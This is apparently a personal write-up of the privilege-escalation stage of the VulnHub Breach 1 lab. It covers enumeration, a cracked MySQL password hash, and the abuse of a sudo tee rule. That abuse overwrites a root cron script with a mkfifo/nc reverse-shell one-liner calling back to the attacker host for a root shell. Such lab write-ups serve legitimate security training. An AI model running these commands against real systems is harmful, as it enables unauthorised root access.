# Privesc
## reverse shell
- We've got our reverse shell from [[25 - HTTPS_M@nag3Me]], after deployment, have to click the `/pwn` link to get the reverse shell
```bash
┌──(htb㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.110.100] from (UNKNOWN) [192.168.110.140] 43116
id
uid=104(tomcat6) gid=112(tomcat6) groups=112(tomcat6)
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'
tomcat6@Breach:/var/lib/tomcat6$ ^Z
[1]+  Stopped                 nc -lvnp 9001
┌──(htb㉿kali)-[~]
└─$ stty raw -echo
┌──(htb㉿kali)-[~]
nc -lvnp 9001

tomcat6@Breach:/var/lib/tomcat6$ stty rows 96 cols 116
tomcat6@Breach:/var/lib/tomcat6$ export TERM=xterm
tomcat6@Breach:/var/lib/tomcat6$ grep bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash
blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash
```

- Check home directory
	- *1059404    4 -rwxrwxrwx   1 milton   milton        755 Jun  4  2016 ./milton/some_script.sh*
	- *1048609  112 -rw-rw-r--   1 milton   milton     111255 Jun  4  2016 ./milton/my_badge.jpg*
	- *1058616    4 -rw-rw-r--   1 milton   milton       2245 May 20  2016 ./milton/.keystore*
```bash
tomcat6@Breach:/home$ find . -ls
917505    4 drwxr-xr-x   4 root     root         4096 Jun  4  2016 .
930005    4 drwxr-xr-x   3 blumbergh blumbergh     4096 Jun 12  2016 ./blumbergh
930179    4 -rw-------   1 blumbergh blumbergh       61 Jun 12  2016 ./blumbergh/.bash_history
930007    4 -rw-r--r--   1 blumbergh blumbergh      220 Jun  4  2016 ./blumbergh/.bash_logout
930009    4 -rw-r--r--   1 blumbergh blumbergh     3637 Jun  4  2016 ./blumbergh/.bashrc
930013    4 drwx------   2 blumbergh blumbergh     4096 Jun  6  2016 ./blumbergh/.cache
find: `./blumbergh/.cache': Permission denied
930011    4 -rw-r--r--   1 blumbergh blumbergh      675 Jun  4  2016 ./blumbergh/.profile
1049078    4 drwxr-xr-x   3 milton   milton       4096 Jun  6  2016 ./milton
1048961    4 -rw-------   1 milton   milton        234 Jun 11  2016 ./milton/.bash_history
1055719    4 -rw-r--r--   1 milton   milton        220 May 20  2016 ./milton/.bash_logout
1055722    4 -rw-r--r--   1 milton   milton       3637 May 20  2016 ./milton/.bashrc
1059404    4 -rwxrwxrwx   1 milton   milton        755 Jun  4  2016 ./milton/some_script.sh
1048611    4 -rw-------   1 milton   milton        407 Jun  4  2016 ./milton/.mysql_history
1049122    4 drwx------   2 milton   milton       4096 May 20  2016 ./milton/.cache
find: `./milton/.cache': Permission denied
1058611    4 -rw-r--r--   1 milton   milton        675 May 20  2016 ./milton/.profile
1048609  112 -rw-rw-r--   1 milton   milton     111255 Jun  4  2016 ./milton/my_badge.jpg
1058616    4 -rw-rw-r--   1 milton   milton       2245 May 20  2016 ./milton/.keystore
1059408    4 -rw-r--r--   1 root     root           66 Jun  4  2016 ./milton/.selected_editor
```

- Checked by md5sum that ./milton/.keystore IS the keystore we've got from web service.
- Checked ./milton/my_bage.jpg, seems nothing

## More Enumeration
### linpeas.sh
1. `4.2.0-27-generic`
2. `/etc/cron.daily/tomcat6`
	- nothing useful from this file.
3. `[+] MySQL connection using root/NOPASS ................. Yes`
	- `milton           | 6450d89bd3aff1d893b85d3ad65d2ec2`
	- `6450d89bd3aff1d893b85d3ad65d2ec2 | md5 | thelaststraw`
4. `/etc/init.d/portly.sh`
	```bash
	iptables -t nat -A PREROUTING -p tcp --match multiport --dport 1:79,81:8442,8444:65535 -j REDIRECT --to-ports 4444 && /usr/local/bin/portspoof -c /usr/local/etc/portspoof.conf -s /usr/local/etc/portspoof_signatures -D
	```
5. This is the part I did not think through, which is user [blumbergh]'s full name is [bill blumbergh] and we still have one piece of information that from bill.png says a comment `coffeestains`, is it easy enough to match this word to user blumbergh's password?
	
### milton
1. not sudo user
2. `-rwxrwxrwx 1 milton milton    755 Jun  4  2016 some_script.sh`
3. nothing useful from .bash_history either

### blumbergh
1. .bash_history
```bash
blumbergh@Breach:~$ cat .bash_history
clear
logoff
logout
exit
cd /usr/share/cleanup
cat tidyup.sh
exit
```
2. tidyup.sh
```bash
blumbergh@Breach:~$ ls -al /usr/share/cleanup/tidyup.sh
-rwxr-xr-x 1 root root 289 Jun 12  2016 /usr/share/cleanup/tidyup.sh

blumbergh@Breach:~$ cat /usr/share/cleanup/tidyup.sh
#!/bin/bash

#Hacker Evasion Script
#Initech Cyber Consulting, LLC
#Peter Gibbons and Michael Bolton - 2016
#This script is set to run every 3 minutes as an additional defense measure against hackers.

cd /var/lib/tomcat6/webapps && find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf

blumbergh@Breach:~$ crontab -l
no crontab for blumbergh
blumbergh@Breach:~$ sudo -l
Matching Defaults entries for blumbergh on Breach:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User blumbergh may run the following commands on Breach:
    (root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh
```

- This is the way...
```bash
blumbergh@Breach:~$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.110.100 9001 >/tmp/f' | sudo
 /usr/bin/tee /usr/share/cleanup/tidyup.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.110.100 9001 >/tmp/f

blumbergh@Breach:~$ cat /usr/share/cleanup/tidyup.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.110.100 9001 >/tmp/f
```

- Root
```bash
┌──(htb㉿kali)-[~/VulnHub/Breach1]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [192.168.110.100] from (UNKNOWN) [192.168.110.140] 43124
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
flair.jpg
# ls -al /root
total 60
drwx------  4 root root  4096 Jun 12  2016 .
drwxr-xr-x 22 root root  4096 Jun  4  2016 ..
-rw-------  1 root root   115 Jun 12  2016 .bash_history
-rw-r--r--  1 root root  3106 Feb 19  2014 .bashrc
drwx------  2 root root  4096 Jun  6  2016 .cache
-rw-r--r--  1 root root   840 Jun 11  2016 .flag.txt
-rw-r--r--  1 root root 23792 Jun  4  2016 flair.jpg
-rw-r--r--  1 root root   140 Feb 19  2014 .profile
drwxr-xr-x  2 root root  4096 Jun  5  2016 .rpmdb
-rw-r--r--  1 root root    66 Jun  4  2016 .selected_editor
# cat /root/.flag.txt
-----------------------------------------------------------------------------------

______                     _     __   _____      _____ _          _____          _
| ___ \                   | |   /  | |  _  |    |_   _| |        |  ___|        | |
| |_/ /_ __ ___  __ _  ___| |__ `| | | |/' |______| | | |__   ___| |__ _ __   __| |
| ___ \ '__/ _ \/ _` |/ __| '_ \ | | |  /| |______| | | '_ \ / _ \  __| '_ \ / _` |
| |_/ / | |  __/ (_| | (__| | | || |_\ |_/ /      | | | | | |  __/ |__| | | | (_| |
\____/|_|  \___|\__,_|\___|_| |_\___(_)___/       \_/ |_| |_|\___\____/_| |_|\__,_|


-----------------------------------------------------------------------------------
Congrats on reaching the end and thanks for trying out my first #vulnhub boot2root!

Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting.

```


